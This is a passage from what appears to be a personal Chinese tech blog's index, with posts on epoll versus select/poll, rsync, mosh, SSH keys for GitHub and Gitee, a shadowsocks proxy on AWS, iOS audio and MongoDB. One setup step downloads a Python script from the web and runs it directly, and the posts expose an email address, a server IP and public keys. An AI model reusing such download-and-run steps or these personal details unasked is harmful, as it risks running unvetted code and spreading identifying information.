通过遍历fdset，来找到就绪的描述符。\n\n\n\n当用户process调用select的时候，select会将需要监控的readfds集合拷贝到内核空间（假设监控的仅仅是socket可读），然后遍历自己监控的socket sk，挨个调用sk的poll逻辑以便检查该sk是否有可读事件，遍历完所有的sk后，如果没有任何一个sk可读，那么select会调用schedule_timeout进入schedule循环，使得process进入睡眠。如果在timeout时间内某个sk上有数据可读了，或者等待timeout了，则调用select的process会被唤醒，接下来select就是遍历监控的sk集合，挨个收集可读事件并返回给用户了\n\n1. 需要拷贝到内核\n2. fds集合有限制 1024\n3. 遍历效率低\n\n\n### poll\n\nint poll(struct pollfd *fds, nfds_t nfds, int timeout);\n\n\npoll没有解决性能问题, 只是解决了 1024 限制问题\n所以是个鸡肋\n\n\nselect遗留的三个问题中，问题(1)是用法限制问题，问题(2)和(3)则是性能问题。poll和select非常相似，poll并没着手解决性能问题，poll只是解决了select的问题(1)fds集合大小1024限制问题。下面是poll的函数原型，poll改变了fds集合的描述方式，使用了pollfd结构而不是select的fd_set结构，使得poll支持的fds集合限制远大于select的1024。poll虽然解决了fds集合大小1024的限制问题，但是，它并没改变大量描述符数组被整体复制于用户态和内核态的地址空间之间，以及个别描述符就绪触发整体描述符集合的遍历的低效问题。poll随着监控的socket集合的增加性能线性下降，poll不适合用于大并发场景。\n\n\n\n### epoll\n\n```\nint epoll_create(int size)；//创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大  新版本用红黑树,这个参数意义不大了\n\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；\n\n函数是对指定描述符fd执行op操作。\n- epfd：是epoll_create()的返回值。\n- op：表示op操作，用三个宏来表示：添加EPOLL_CTL_ADD，删除EPOLL_CTL_DEL，修改EPOLL_CTL_MOD。分别添加、删除和修改对fd的监听事件。\n- fd：是需要监听的fd（文件描述符）\n- epoll_event：是告诉内核需要监听什么事，struct epoll_event结构如下：\n\nstruct epoll_event {\n  __uint32_t events;  /* Epoll events */\n  epoll_data_t data;  /* User data variable */\n};\n\n//events可以是以下几个宏的集合：\nEPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；\nEPOLLOUT：表示对应的文件描述符可以写；\nEPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；\nEPOLLERR：表示对应的文件描述符发生错误；\nEPOLLHUP：表示对应的文件描述符被挂断；\nEPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。\nEPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里\n\n\n\n\nint epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);\n\n等待epfd上的io事件，最多返回maxevents个事件。\n参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。\n```\n\n* 拷贝问题的解决\n\nepoll引入了epoll_ctl系统调用，将高频调用的epoll_wait和低频的epoll_ctl隔离开。同时，epoll_ctl通过(EPOLL_CTL_ADD、EPOLL_CTL_MOD、EPOLL_CTL_DEL)三个操作来分散对需要监控的fds集合的修改，做到了有变化才变更，将select或poll高频、大块内存拷贝(集中处理)变成epoll_ctl的低频、小块内存的拷贝(分散处理)，避免了大量的内存拷贝。\n\n\n同时，对于高频epoll_wait的可读就绪的fd集合返回的拷贝问题，epoll通过内核与用户空间mmap(内存映射)同一块内存来解决。mmap将用户空间的一块地址和内核空间的一块地址同时映射到相同的一块物理内存地址（不管是用户空间还是内核空间都是虚拟地址，最终要通过地址映射映射到物理地址），使得这块物理内存对内核和对用户均可见，减少用户态和内核态之间的数据交换。\n\n\n* 循环问题解决\n\nepoll引入了2个中间层，一个双向链表(ready_list)，一个单独的睡眠队列(single_epoll_wait_list)，\n\n---\n\n\n\nepoll巧妙的引入一个中间层解决了大量监控socket的无效遍历问题。细心的同学会发现，epoll在中间层上为每个监控的socket准备了一个单独的回调函数epoll_callback_sk，而对于select/poll，所有的socket都公用一个相同的回调函数。正是这个单独的回调epoll_callback_sk使得每个socket都能单独处理自身，当自己就绪的时候将自身socket挂入epoll的ready_list。\n\n---\n\n同时，epoll引入了一个睡眠队列single_epoll_wait_list，分割了两类睡眠等待。process不再睡眠在所有的socket的睡眠队列上，而是睡眠在epoll的睡眠队列上，在等待”任意一个socket可读就绪”事件。而中间wait_entry_sk则代替process睡眠在具体的socket上，当socket就绪的时候，它就可以处理自身了。\n\n\n\n### epoll LT ET\n\n　epoll对文件描述符的操作有两种模式：LT（level trigger）和ET（edge trigger）。LT模式是默认模式，LT模式与ET模式的区别如下：\n\n　　LT模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用epoll_wait时，会再次响应应用程序并通知此事件。\n\n　　ET模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。\n\n\n\n1. LT模式\nLT(level triggered)是缺省的工作方式，并且同时支持block和no-block socket.在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的。\n\n\n2. ET模式\nET(edge-triggered)是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知，直到你做了某些操作导致那个文件描述符不再为就绪状态了(比如，你在发送，接收或者接收请求，或者发送接收的数据少于一定量时导致了一个EWOULDBLOCK 错误）。但是请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once)\n\nET模式在很大程度上减少了epoll事件被重复触发的次数，因此效率要比LT模式高。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。\n\n\n\n\n当使用epoll的ET模型来工作时，当产生了一个EPOLLIN事件后，\n读数据的时候需要考虑的是当recv()返回的大小如果等于请求的大小，那么很有可能是缓冲区还有数据未读完，也意味着该次事件还没有处理完，所以还需要再次读取：(阻塞其他的)\n\n\n\n\n### 总结\n\n（1）select，poll实现需要自己不断轮询所有fd集合，直到设备就绪，期间可能要睡眠和唤醒多次交替。而epoll其实也需要调用`epoll_wait`不断轮询就绪链表，期间也可能多次睡眠和唤醒交替，但是它是设备就绪时，调用回调函数，把就绪fd放入就绪链表中，并唤醒在`epoll_wait`中进入睡眠的进程。虽然都要睡眠和交替，但是select和poll在“醒着”的时候要遍历整个fd集合，而epoll在“醒着”的时候只要判断一下就绪链表是否为空就行了，这节省了大量的CPU时间。这就是回调机制带来的性能提升。\n\n（2）select，poll每次调用都要把fd集合从用户态往内核态拷贝一次，并且要把current往设备等待队列中挂一次，而epoll只要一次拷贝，而且把current往等待队列上挂也只挂一次（在epoll_wait的开始，注意这里的等待队列并不是设备等待队列，只是一个epoll内部定义的等待队列）。这也能节省不少的开销。\n\n\n### 心得\n\n所以，如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用multi-threading + blocking IO的web server性能更好，可能延迟还更大。select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接。）\n\n\n\n如果没有大量的idle -connection或者dead-connection，epoll的效率并不会比select/poll高很多，但是当遇到大量的idle- connection，就会发现epoll的效率大大高于select/poll。\n\n\n\n在IO multiplexing Model中，实际中，对于每一个socket，一般都设置成为non-blocking，但是，如上图所示，整个用户的process其实是一直被block的。只不过process是被select这个函数block，而不是被socket IO给block。\n\n\n\n有人会说，non-blocking IO并没有被block啊。这里有个非常“狡猾”的地方，定义中所指的”IO operation”是指真实的IO操作，就是例子中的recvfrom这个system call。non-blocking IO在执行recvfrom这个system call的时候，如果kernel的数据没有准备好，这时候不会block进程。但是，当kernel中数据准备好的时候，recvfrom会将数据从kernel拷贝到用户内存中，这个时候进程是被block了，在这段时间内，进程是被block的。\n\n\n\n---\n知乎回答:\n\nIO模式一般分为同步IO和异步IO.  同步IO会阻塞进程, 异步IO不会阻塞进程. 目前linux上大部分用的是同步IO, 异步IO在linux上目前还不成熟, 不过windows的iocp算是真正的异步IO。\n\n\n\n同步IO又分为阻塞IO, 非阻塞IO, IO多路复用.  What? 同步IO明明会阻塞进程,为什么也包括非阻塞IO?  因为非阻塞IO虽然在请求数据时不阻塞, 但真正数据来临时,也就是内核数据拷贝到用户数据时, 此时进程是阻塞的.\n\n\n\n那么这些IO模式的区别分别是什么? 接下来举个小例子来说明. 假设你现在去女生宿舍楼找自己的女神, 但是你只知道女神的手机号,并不知道女神的具体房间\n\n\n\n先说同步IO的情况,\n\n1. 阻塞IO,   给女神发一条短信, 说我来找你了, 然后就默默的一直等着女神下楼, 这个期间除了等待你不会做其他事情, 属于备胎做法.\n\n\n\n2. 非阻塞IO, 给女神发短信, 如果不回, 接着再发, 一直发到女神下楼, 这个期间你除了发短信等待不会做其他事情, 属于专一做法.\n\n\n\n3. IO多路复用,  是找一个宿管大妈来帮你监视下楼的女生, 这个期间你可以些其他的事情. 例如可以顺便看看其他妹子,玩玩王者荣耀, 上个厕所等等.  IO复用又包括 select, poll, epoll 模式. 那么它们的区别是什么?\n\n\n\n3.1 select大妈    每一个女生下楼, select大妈都不知道这个是不是你的女神, 她需要一个一个询问, 并且select大妈能力还有限, 最多一次帮你监视1024个妹子\n\n\n\n3.2 poll大妈不限制盯着女生的数量,  只要是经过宿舍楼门口的女生, 都会帮你去问是不是你女神\n\n\n\n3.3 epoll大妈不限制盯着女生的数量, 并且也不需要一个一个去问.  那么如何做呢?  epoll大妈会为每个进宿舍楼的女生脸上贴上一个大字条,上面写上女生自己的名字,  只要女生下楼了, epoll大妈就知道这个是不是你女神了, 然后大妈再通知你.\n\n\n\n上面这些同步IO有一个共同点就是, 当女神走出宿舍门口的时候, 你已经站在宿舍门口等着女神的, 此时你属于阻塞状态\n\n\n\n接下来是异步IO的情况\n\n你告诉女神我来了, 然后你就去王者荣耀了, 一直到女神下楼了, 发现找不见你了, 女神再给你打电话通知你, 说我下楼了, 你在哪呢?  这时候你才来到宿舍门口. 此时属于逆袭做法.\n","tags":["linux"],"categories":["系统"]},{"title":"rsync同步文件","url":"%2Fp%2Ff67a2ed5.html","content":"\n\n参考链接: http://blog.csdn.net/zpf336/article/details/51659666\n\n\n### 把本地文件同步到远程服务器\n```\nrsync -avz '-e ssh -i /Users/liuwei/.ssh/aws.pem' /Users/liuwei/golang/src/web --progress ubuntu@54.191.9.26:/home/ubuntu\n```\n\n<!-- more -->\n### client\n\n```\nrsync -vzrtopg --progress  ubuntu@54.191.9.26::ftp .   //同步服务器的文件到当前目录\n```\n\n### server\n\n```\n[ftp]\n\n        comment = public archive\n        path = /home/ubuntu/rsync\n        use chroot = yes\n#       max connections=10\n        lock file = /var/lock/rsyncd\n# the default for read only is yes...\n        read only = yes\n        list = yes\n        uid = nobody\n        gid = nogroup\n#       exclude =\n#       exclude from =\n#       include =\n#       include from =\n        auth users =  ubuntu\n        secrets file = /etc/rsyncd.secrets\n        strict modes = yes\n#       hosts allow =\n#       hosts deny =\n        ignore errors = no\n        ignore nonreadable = yes\n        transfer logging = no\n#       log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.\n        timeout = 600\n        refuse options = checksum dry-run\n        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\n\n```\n\n\n\n### 在本地机器上对两个目录同步\n\n```\nrsync -zvr filename1 filename2\n```\n上述代码是将filename1中的文件与filename2中的文件同步\n\n### 使用rsync –a 同步保留时间按标记\n\n```\nrsync -azv filename1 filename2  \n```\n\n使用上述命令，将filename2中新同步的文件的时间与filename1中的创建的时间相同，它保留符号链接、权限、时间标记、用户名及组名相同。\n\n### 将远程服务器的文件同步到本地\n\n```\nrsync -avz ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n上述命令是将远程192.168.0.1的主机上filename2同步到本地的filename1。\n注意：如果远程主机的端口不是默认的22端口，假如是4000端口，上述的命令修改为，\n\n```\nrsync -avz '-e ssh -p 4000' ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n### 从本地同步文件到远程服务器\n\n```\nrsync -avz filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n上述命令是将本地的filename1同步到远程192.168.0.1的主机上。\n同理如果端口不是22，使用以下命令\n\n```\nrsync -avz '-e ssh -p 4000' filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n","tags":["linux"],"categories":["命令"]},{"title":"mosh解决ssh远程连接延迟","url":"%2Fp%2F21b6636c.html","content":"\n\n### 安装mosh\n```\nsudo apt-get install mosh //server\nbrew install mobile-shell //mac\n```\n\n\n### 需要先设置本地\nlocale-gen zh_CN.UTF-8\n\n### 远程服务器开启 mosh-server\n\n### 需要aws开启udp mosh的端口\n\n### 客户端连接\n\n```\n mosh ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com -ssh=\"ssh -i 'aws.pem'\"\n```\n","tags":["linux"],"categories":["命令"]},{"title":"gitHub提交PullRequest","url":"%2Fp%2Fa35ae0bf.html","content":"\n\n### fork别人的仓库\n首先，在 GitHub 上 fork 到自己的仓库，如 docker_user/blockchain_guide，然后 clone 到本地，并设置用户信息。\n\n```\n$ git clone git@github.com:docker_user/blockchain_guide.git\n$ cd blockchain_guide\n$ #do some change on the content\n$ git commit -am \"Fix issue #1: change helo to hello\"\n$ git push\n```\n\n<!-- more -->\n\n### [remote rejected] master -> master (permission denied)\n\n```\nType command:\n\ngit config --global --edit\nAdd these lines of configuration at the end of file:\n\n[credential]\n  helper = osxkeychain\n  useHttpPath = true\n```\n  \n  \n### 更新自己的仓库\n  \n  ```\n  git remote add upstream https://github.com/unix2dos/GolangWeb\n  git fetch upstream\n  git checkout master\n  git rebase upstream/master\n  git push -f origin master\n  ```\n ","tags":["git"],"categories":["git"]},{"title":"github和gitee通过密钥来进行ssh连接","url":"%2Fp%2Fa9407b5.html","content":"\n## 一. github\n\n#### 1 生成公钥私钥\n\n```\nssh-keygen -t rsa -b 4096 -C \"levonfly@gmail.com\"\n```\n\n第一步sava file 写成github, 密码可以为空\n\n\n\n<!-- more -->\n\n#### 2 添加到github里面\n\n```\ncat github.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDmlu8zfJ+RuSREk0TGjuhujZbuuC1J+nAoQtkAmckfnbD8flJ6OEidSQbTqPRaQKIKObUKGobBeDWoHdJNVDGuyAPnSBnq7LI8ToKha91S4HLf8SNCtQHqCfMReNdPawav9rKN7hwos0Ho6fIMWtSRaJmZkw8gFwj4PuqfxuKzIm/hVaRCia8DJkLcyWfTYJAUkmoQHHIgJyNn0lTxs0AH0UzzfAoXiOzT6KRir5cKxhz+RCbz+ZTxmepDgM0uV/bN/rArJ/98QDknE8R4d5l88fXTR1vR98J7qgOrH+J6H15xtIInqtlGiHjv1FKu79p0t7o3WpajijiSsw8wFjlZ2Y4A8Hdm2+w7eWTUMasPbxWn4Jne2SAOWd4PsoOr3Fp0obH2RjQyibQ/WfGHHpOtJs9zGJoBs9YwmxexhhmHbCqGJ/KO6HYv9DssaLE9qG0gUshSiZtSbmaDOwttg2XfpieERrdt5SM4gsv7/MMQR5V2vZnzaKrh4++8oix48xAl27iR9qFXoqdOkXQ3CVXp15fMuQuhrzO73/mZnw8G0G5r5gzYt9ywwx+Jp9K1DLSrFESOLjAHec/8qbcSn7pUVkVkTUDvE8e+4bVnPRXe+MYa8aKybSx0OVB/foWKJlO5hgik/MHB3kVEQreoDJEv+ts5JIgEEsxtuEqfeDPdvw== levonfly@gmail.com\n```\n添加到  https://github.com/settings/keys\n\n+ ssh-rsa 要复制\n+ 邮箱不复制\n+ 生成的密钥只能用在一个帐号上面\n\n\n\n\n#### 3 测试是否连接到github, 现在带上私钥\n\n```\nssh -T git@github.com -i github\n```\n\n\n#### 4 添加到config, git使用私钥\n\n```\nhost github.com\n HostName github.com\n IdentityFile ~/.ssh/github\n User levon\n```\n\n\n\n## 二. 码云\n\n#### 0 添加的时候一定要添加ssh地址\n\n```\ngit remote add liuwei git@gitee.com:metrics-client-res/ReadingMate.git\n```\n\n#### 1 生成公钥私钥\n\n```\nssh-keygen -t rsa -C \"levonfly@gmail.com\"  \n```\n第一步sava file 写成mayun, 密码可以为空\n\n#### 2 添加到gitee里面\n\n```\ncat ~/.ssh/mayun.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOD++FY3wmtogXUNkSVl7ZLF8jLFJsua79Tvg5ywY+YngvjCW7EsWps7M3MeVYBxht4vuFrA3qeDD3UlTE8hKJUHJaCSrfjWT/uTo9OQKK2hW/nyvNJomz5aqBoArEIPD5Ab6cqpOpMElrUDEKrfW+3FWR++mpS/ig9NNR5l2GuIYIJOt4NOkXPALd8gWjRMPedOI8MJLstK4M7BinMaoSgwOoNWYrEmDXDcJpNt7c40T83npGd5TLfN3Oq50aZwSPfzBJfDzk+kBdplrg+a7YR50TP9/URE4MKrmRToOXyVuCucRn6WTskVbt+lJqBnzO/CkTRvIeOCuaZcQqLoTH levonfly@gmail.com\n```\n添加到地址 https://gitee.com/profile/sshkeys\n\n#### 3 测试是否连接到码云, 现在带上私钥\n\n```\nssh -T git@gitee.com -i mayun\n```\n\n#### 4 添加到config, git使用私钥\n\n```\nhost gitee.com\n HostName gitee.com\n IdentityFile ~/.ssh/mayun\n User levon\n```\n","tags":["git"],"categories":["git"]},{"title":"aws搭建shadowsocks梯子翻墙","url":"%2Fp%2F934b1a1.html","content":"\n### 部署aws\n1. aws免费1年,申请的时候需要信用卡,没有信用卡的可以淘宝购买虚拟信用卡\n\n2. 申请成功,创建Ec2实例, 下载私钥, 注意保存好\n3. ssh连接aws, 因为淘宝购买的信用卡只能在美国2个地区部署, 中国连接会发现特别卡顿, 可以用mosh连接,后面我会写怎么使用mosh连接\n```\nchmod 400 aws.pem\nssh -i \"aws.pem\" ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com\n```\n4. 修改root密码\n```\nsudo passwd root\n```\n<!-- more -->\n-------\n\n### 安装shadowsocks\n\n1. 更新apt-get\n```\n apt-get update\n apt-get install python-pip //安装python-pip\n```\n\n2. 安装python-pip:\n```\nsudo apt-get purge python-pip\nwget https://bootstrap.pypa.io/get-pip.py\npython get-pip.py\nhash -r\n```\n3. 安装shadowsocks\n```\npip install shadowsocks // 安装shadowsocks\nssserver -c /etc/shadowsocks.json -d start //启动shadowsocks\n```\n4. 配置shadowsocks\nshadowsocks.json需要自己创建，默认是没有的 注意端口修改的是server_port, local_port是固定的\n```\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789,\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"******\",\n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",\n  \"fast_open\": false,\n  \"workers\": 1\n}\n```\n配置以后重启shadowsocks:\n```\nsudo ssserver -c /etc/shadowsocks.json -d restart\n```\n\n\n### 配置aws和使用shadowsocks翻墙\n\n安装之后，添加服务器，地址为AWS的外网地址，登录AWS控制台，查看正在运行中的实例，找到公有ip。 端口号为刚才配置Shadowsocks服务器时的端口号，密码也是刚才配置的，设置完之后保存。\n\n![id1](aws搭建shadowsocks梯子翻墙/1.png)\n\n\n配置好shaodowsocks后，还需要将配置中的端口打开,这样客户端的服务才能链接得上EC2中的shadowsocks服务\n首先打开正在运行的实例，向右滚动表格，最后一项，安全组，点击进入，编辑入站规则，默认是开启了一个22端口（这是给ssh访问的）\n\n![id2](aws搭建shadowsocks梯子翻墙/2.png)\n\n\n>如果不放心流量超限的话可以设置下账单报警。\n\n","tags":["aws"],"categories":["科学上网"]},{"title":"iOS录音遇到的问题","url":"%2Fp%2F9ecea432.html","content":"### iOS使用openAL控制声音的输出设备\n项目中播放ios录音的时候使用的是AVAudio相关库, 播放音效又是用的openAL.\n如果同时或交替播放这两类声音, 会造成声音一会从听筒发声,一会从扬声器发声.\n千辛万苦找到解决方案:\n\n```cpp\nInteresting enough, it can be done!\n\nBasically you add a property listener to get route change events:\n    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, audioRouteChangeListenerCallback,0);\n\n\tThen in the callback, determine if its a headphone being plugged-in and override the audio route:\n\t        UInt32 audioRouteOverride = kAudioSessionOverrideAudioRoute_Speaker;\n\t\t\t        AudioSessionSetProperty(kAudioSessionProperty_OverrideAudioRoute, sizeof(audioRouteOverride), &audioRouteOverride);\n\n\t\t\t\t\tToo simple...\n```\n\n\n### iOS AVAudioSession 监听静音开关\n录音使用AVAudioSession播放的时候, 无法识别Iphone手机的物理静音开关,需要修改下模式\n\n\n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];\n```\n\n修改成\n        \n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategorySoloAmbient error:nil];//监听静音\n```\n\n\n\n","tags":["ios"],"categories":["ios"]},{"title":"mongodb操作教程","url":"%2Fp%2Fd34774ef.html","content":"\n\n### 数据库操作\n\n+ 创建数据库\n\n```\nuse study\n```\n\n如果你想查看所有数据库，可以使用 show dbs 命令：\n刚创建的数据库并不在数据库的列表中， 要显示它，我们需要向 数据库插入一些数据。\n\n+ 查看当前在哪个数据库\n\n```\n> db\nstudy\n```\n<!-- more -->\n+ 删除数据库\n\n```\ndb.dropDatabase()\n```\n<!-- more -->\n### 文档操作\n\n+ 向文档插入东西\n\n```\ndb.test.insert({\"name\":\"test\"})\n```\n\n+ 查询文档内容\n\n```\n> db.test.find()\n{ \"_id\" : ObjectId(\"58da1f0e767a1e8a0cedff28\"), \"name\" : \"test\" }\n\ndb.test.find().pretty() //格式化输出\n```\n\n+ 删除文档(注意这个删掉, remove是删除数据)\n\n```\ndb.test.drop()\n```\n\n\n+ 显示文档\n\n```\n> show tables;\nsystem.indexes\ntest\n```\n\n+ 更新文档\n\n```\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n\n参数说明：\n  ● query : update的查询条件，类似sql update查询内where后面的。\n  ● update : update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的\n  ● upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。\n  ● multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。\n  ● writeConcern :可选，抛出异常的级别\n```\n\n例子:\n\n```\ndb.col.insert({\n    title: 'MongoDB 教程', \n    description: 'MongoDB 是一个 Nosql 数据库',\n    tags: ['mongodb', 'database', 'NoSQL'],\n    likes: 100\n})\n\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}})\ndb.col.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}},{multi:true})\n```\n\n>更多实例:\n\n```\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 1 } } , { $set : { \"test2\" : \"OK\"} } );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 3 } } , { $set : { \"test2\" : \"OK\"} },false,true );\n只添加第一条：\ndb.col.update( { \"count\" : { $gt : 4 } } , { $set : { \"test5\" : \"OK\"} },true,false );\n全部添加加进去:\ndb.col.update( { \"count\" : { $gt : 5 } } , { $set : { \"test5\" : \"OK\"} },true,true );\n全部更新：\ndb.col.update( { \"count\" : { $gt : 15 } } , { $inc : { \"count\" : 1} },false,true );\n只更新第一条记录：\ndb.col.update( { \"count\" : { $gt : 10 } } , { $inc : { \"count\" : 1} },false,false );\n```\n\n+ save文档\n\n```\ndb.collection.save(\n   <document>,\n   {\n     writeConcern: <document>\n   }\n)\n  ● document : 文档数据。\n  ● writeConcern :可选，抛出异常的级别。\n\n以下实例中我们替换了 _id 为 56064f89ade2f21f36b03136 的文档数据： (通过指定id替换文档)\ndb.col.save({\n    \"_id\" : ObjectId(\"56064f89ade2f21f36b03136\"),\n    \"title\" : \"MongoDB\",\n    \"description\" : \"MongoDB 是一个 Nosql 数据库\",\n    \"tags\" : [\n            \"mongodb\",\n            \"NoSQL\"\n    ],\n    \"likes\" : 110\n})\n```\n\n+ remove 文档\n\n```\ndb.collection.remove(\n   <query>,\n   {\n     justOne: <boolean>,\n     writeConcern: <document>\n   }\n)\n  ● query :（可选）删除的文档的条件。\n  ● justOne : （可选）如果设为 true 或 1，则只删除一个文档。\n  ● writeConcern :（可选）抛出异常的级别。\n```\n\n如果你想删除所有数据，可以使用以下方式（类似常规 SQL 的 truncate 命令）：\n\n```\n>db.col.remove({})\n>db.col.find()\n>\n```\n\n\n\n### 文档查询\nMongoDB 与 RDBMS Where 语句比较\n如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：\n\n```\n操作 格式 范例 RDBMS中的类似语句\n等于 {<key>:<value>} db.col.find({\"by\":\"菜鸟教程\"}).pretty() where by = '菜鸟教程'\n小于 {<key>:{$lt:<value>}} db.col.find({\"likes\":{$lt:50}}).pretty() where likes < 50\n小于或等于 {<key>:{$lte:<value>}} db.col.find({\"likes\":{$lte:50}}).pretty() where likes <= 50\n大于 {<key>:{$gt:<value>}} db.col.find({\"likes\":{$gt:50}}).pretty() where likes > 50\n大于或等于 {<key>:{$gte:<value>}} db.col.find({\"likes\":{$gte:50}}).pretty() where likes >= 50\n不等于 {<key>:{$ne:<value>}} db.col.find({\"likes\":{$ne:50}}).pretty() where likes != 50\n```\n\n+ MongoDB AND 条件\nMongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，及常规 SQL 的 AND 条件。\n语法格式如下：\n\n```\n>db.col.find({key1:value1, key2:value2}).pretty()\n```\n\n+ MongoDB OR 条件\nMongoDB OR 条件语句使用了关键字 $or,语法格式如下：\n\n```\n>db.col.find(\n   {\n      $or: [\n\t     {key1: value1}, {key2:value2}\n      ]\n   }\n).pretty()\n```\n\n+ AND 和 OR 联合使用\n以下实例演示了 AND 和 OR 联合使用，类似常规 SQL 语句为： 'where likes>50 AND (by = '菜鸟教程' OR title = 'MongoDB 教程')'\n\n```\n>db.col.find({\"likes\": {$gt:50}, $or: [{\"by\": \"菜鸟教程\"},{\"title\": \"MongoDB 教程\"}]}).pretty()\n```\n\n\n### 操作符- $type 实例\n\n```\n类型 数字 备注\nDouble 1 \nString 2 \nObject 3 \nArray 4 \nBinary data 5 \nUndefined 6 已废弃。\nObject id 7 \nBoolean 8 \nDate 9 \nNull 10 \nRegular Expression 11 \nJavaScript 13 \nSymbol 14 \nJavaScript (with scope) 15 \n32-bit integer 16 \nTimestamp 17 \n64-bit integer 18 \nMin key 255 Query with -1.\nMax key 127 \n```\n\n如果想获取 \"col\" 集合中 title 为 String 的数据，你可以使用以下命令：\n\n```\ndb.col.find({\"title\" : {$type : 2}})\n```\n\n+ Limit()方法  \n如果你需要在MongoDB中读取指定数量的数据记录，可以使用MongoDB的Limit方法，limit()方法接受一个数字参数，该参数指定从MongoDB中读取的记录条数。\n\nlimit()方法基本语法如下所示：\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER)\n```\n\n+ Skip() 方法\n\n我们除了可以使用limit()方法来读取指定数量的数据外，还可以使用skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。\n\nskip() 方法脚本语法格式如下：\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)\n```\n\n看下面的这个例子, 说明find没有条件, 结果后面字段显示title, _id不显示, \n\n```\n>db.col.find({},{\"title\":1,_id:0}).limit(1).skip(1)\n{ \"title\" : \"Java 教程\" }\n>\n```\n\n\n+ Sort()方法\n在MongoDB中使用使用sort()方法对数据进行排序，sort()方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而-1是用于降序排列。\n\n\nsort()方法基本语法如下所示：\n\n```\n>db.COLLECTION_NAME.find().sort({KEY:1})\n```\n\n```\n>db.col.find({},{\"title\":1,_id:0}).sort({\"likes\":-1})\n{ \"title\" : \"PHP 教程\" }\n{ \"title\" : \"Java 教程\" }\n{ \"title\" : \"MongoDB 教程\" }\n>\n```\n\n### 索引:\nensureIndex() 方法\nensureIndex()方法基本语法格式如下所示：\n\n```\n>db.COLLECTION_NAME.ensureIndex({KEY:1})\n```\n语法中 Key 值为你要创建的索引字段，1为指定按升序创建索引，如果你想按降序来创建索引指定为-1即可。\n\nensureIndex() 方法中你也可以设置使用多个字段创建索引（关系型数据库中称作复合索引）。\n\n```\n>db.col.ensureIndex({\"title\":1,\"description\":-1})\n>\n```\n\nensureIndex() 接收可选参数，可选参数列表如下：\n\n```\nParameter Type Description\nbackground Boolean 建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 \"background\" 可选参数。 \"background\" 默认值为false。\nunique Boolean 建立的索引是否唯一。指定为true创建唯一索引。默认值为false.\nname string 索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。\ndropDups Boolean 在建立唯一索引时是否删除重复记录,指定 true 创建唯一索引。默认值为 false.\nsparse Boolean 对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 false.\nexpireAfterSeconds integer 指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。\nv index version 索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。\nweights document 索引权重值，数值在 1 到 99,999 